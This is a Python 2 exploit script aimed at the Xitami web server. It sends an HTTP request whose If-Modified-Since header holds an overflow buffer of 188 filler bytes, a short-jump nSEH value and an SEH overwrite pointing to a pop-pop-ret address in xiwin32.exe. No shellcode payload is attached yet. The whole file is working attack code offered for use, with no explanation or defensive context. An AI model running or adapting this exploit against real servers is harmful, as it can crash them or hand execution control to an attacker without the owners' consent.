#!/usr/bin/python

import socket
import os
import sys

ip = "192.168.100.120"
port = 80

nSEH = "\x74\xF9\x90\x90" # short jump 5 bytes Back
SEH  = "\x52\x37\x42"     # 0x00423752 - ppr - C:\Xitami\xiwin32.exe

crash  = "A" * 188
crash += nSEH
crash += SEH
#crash += "D" * (1000 - len(crash))


req  = "GET / HTTP/1.1\r\n"
req += "Host: 192.168.100.120\r\n"
req += "User-Agent: Mozilla/5.0 Firefox/68.0\r\n"
req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
req += "Accept-Language: en-US,en;q=0.5\r\n"
req += "Accept-Encoding: gzip, deflate\r\n"
req += "Referer: http://192.168.100.120/\r\n"
req += "Connection: close\r\n"
req += "Upgrade-Insecure-Requests: 1\r\n"
req += "If-Modified-Since: Thu, " + crash + " \r\n"
req += "Cache-Control: max-age=0\r\n\r\n\r\n"

print "[*] Sending evil http request to target"
expl = socket.socket ( socket.AF_INET, socket.SOCK_STREAM )
expl.connect((ip, port))
expl.send(req)
expl.close()

